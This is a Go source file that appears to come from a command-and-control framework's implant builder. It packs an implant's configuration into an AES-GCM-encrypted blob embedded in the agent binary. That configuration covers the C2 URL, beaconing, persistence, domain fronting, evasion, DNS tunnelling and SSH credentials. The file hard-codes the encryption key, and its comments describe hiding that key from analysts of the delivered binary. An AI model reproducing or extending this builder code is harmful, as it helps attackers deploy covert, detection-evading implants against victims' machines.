package payload

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
)

// agentConfigJSON mirrors the agent's config var names so the blob can be
// reapplied over the agent's in-code defaults at runtime. It is serialized and
// XOR-obfuscated with a per-build random key, then injected into the binary via
// a single `-ldflags -X main.ConfigBlob=<blob>` value, replacing the previous
// ~35 separate -X flags.
type agentConfigJSON struct {
	C2URL            string `json:"c2_url"`
	Interval         string `json:"interval"`
	Jitter           string `json:"jitter"`
	UserAgent        string `json:"user_agent"`
	Persist          string `json:"persist"`
	SkipTLSVerify    string `json:"skip_tls"`
	Protocol         string `json:"protocol"`
	Debug            string `json:"debug"`
	BeaconURI        string `json:"beacon_uri"`
	BeaconMethod     string `json:"beacon_method"`
	ListenerID       string `json:"listener_id"`
	P2PMode          string `json:"p2p_mode"`
	P2PParent        string `json:"p2p_parent"`
	P2PListenAddr    string `json:"p2p_listen"`
	DNSDomain        string `json:"dns_domain"`
	DNSServer        string `json:"dns_server"`
	DNSDoHURL        string `json:"dns_doh"`
	DNSDoTAddr       string `json:"dns_dot"`
	Proxy            string `json:"proxy"`
	CryptoKey        string `json:"crypto_key"`
	BeaconKey        string `json:"beacon_key"`
	RegSecretID      string `json:"reg_secret_id"`
	RegSecret        string `json:"reg_secret"`
	ExpiryDate       string `json:"expiry"`
	Evasion          string `json:"evasion"`
	DomainFront      string `json:"domain_front"`
	WorkingStart     string `json:"work_start"`
	WorkingEnd       string `json:"work_end"`
	WorkingTZ        string `json:"work_tz"`
	BeaconTransport  string `json:"beacon_transport"`
	SSHUser          string `json:"ssh_user"`
	SSHPassword      string `json:"ssh_password"`
	SSHKey           string `json:"ssh_key"`
	SSHHostKey       string `json:"ssh_host_key"`
	PinnedCertSHA256 string `json:"pinned_cert"`
	SelfCheckSHA256  string `json:"self_check"`
	MalleablePrepend string `json:"malleable_prepend"`
	MalleableAppend  string `json:"malleable_append"`
}

// configBlobKeyHex is the AES-256 key material (64 hex chars) shared with the
// agent. The agent binary only ever carries it through the strxor table
// (SConfigKey, re-encoded with a fresh XOR key every build), so the plaintext
// key never appears in the delivered binary — only in this builder source.
const configBlobKeyHex = "947ce1b2f693c5a0f79e7ab52674948b9e4fbc7ff39ae4021d98612e07d05a96"

// obfuscateBlob encrypts the config blob with AES-256-GCM using the shared
// builder key. Format: base64(nonce || ciphertext || tag). Unlike the old XOR
// scheme (where the key travelled alongside the data in the blob) the cipher
// is authenticated and the key is not recoverable from the blob alone.
func obfuscateBlob(plaintext []byte) string {
	key, err := hex.DecodeString(configBlobKeyHex)
	if err != nil {
		return ""
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return ""
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return ""
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return ""
	}
	sealed := gcm.Seal(nonce, nonce, plaintext, nil)
	return base64.StdEncoding.EncodeToString(sealed)
}

// buildConfigBlob serializes the resolved implant configuration into the
// obfuscated runtime config block that the agent decodes during init().
func buildConfigBlob(cfg ImplantConfig, profile MalleableProfile) string {
	persistStr := "false"
	if cfg.Persist {
		persistStr = "true"
	}
	skipTLSTxt := "false"
	if cfg.SkipTLSVerify {
		skipTLSTxt = "true"
	}
	evasionStr := "false"
	if cfg.Evasion {
		evasionStr = "true"
	}

	p2pMode := cfg.P2PMode
	if p2pMode == "" && cfg.Protocol == "p2p" {
		p2pMode = "tcp"
	}

	listenerID := "0"
	if cfg.ListenerID > 0 {
		listenerID = fmt.Sprintf("%d", cfg.ListenerID)
	}

	transport := cfg.BeaconTransport
	if transport == "" {
		transport = cfg.Protocol
	}
	if transport == "" {
		transport = "http"
	}

	bc := agentConfigJSON{
		C2URL:            cfg.C2URL,
		Interval:         fmt.Sprintf("%d", cfg.Interval),
		Jitter:           fmt.Sprintf("%d", cfg.Jitter),
		UserAgent:        cfg.UserAgent,
		Persist:          persistStr,
		SkipTLSVerify:    skipTLSTxt,
		Protocol:         cfg.Protocol,
		Debug:            fmt.Sprintf("%t", cfg.Debug),
		BeaconURI:        profile.BeaconURI,
		BeaconMethod:     profile.Method,
		ListenerID:       listenerID,
		P2PMode:          p2pMode,
		P2PParent:        cfg.P2PParent,
		P2PListenAddr:    cfg.P2PListenAddr,
		DNSDomain:        cfg.DNSDomain,
		DNSServer:        cfg.DNSServer,
		DNSDoHURL:        cfg.DNSDoHURL,
		DNSDoTAddr:       cfg.DNSDoTAddr,
		Proxy:            cfg.Proxy,
		CryptoKey:        cfg.CryptoKey,
		BeaconKey:        cfg.BeaconKey,
		RegSecretID:      cfg.RegSecretID,
		RegSecret:        cfg.RegSecret,
		ExpiryDate:       cfg.ExpiryDate,
		Evasion:          evasionStr,
		DomainFront:      cfg.DomainFront,
		WorkingStart:     cfg.WorkingStart,
		WorkingEnd:       cfg.WorkingEnd,
		WorkingTZ:        cfg.WorkingTZ,
		BeaconTransport:  transport,
		SSHUser:          cfg.SSHUser,
		SSHPassword:      cfg.SSHPassword,
		SSHKey:           cfg.SSHKey,
		SSHHostKey:       cfg.SSHHostKey,
		PinnedCertSHA256: cfg.PinnedCertSHA256,
		SelfCheckSHA256:  cfg.SelfCheckSHA256,
		MalleablePrepend: cfg.MalleablePrepend,
		MalleableAppend:  cfg.MalleableAppend,
	}
	raw, err := json.Marshal(bc)
	if err != nil {
		return ""
	}
	return obfuscateBlob(raw)
}
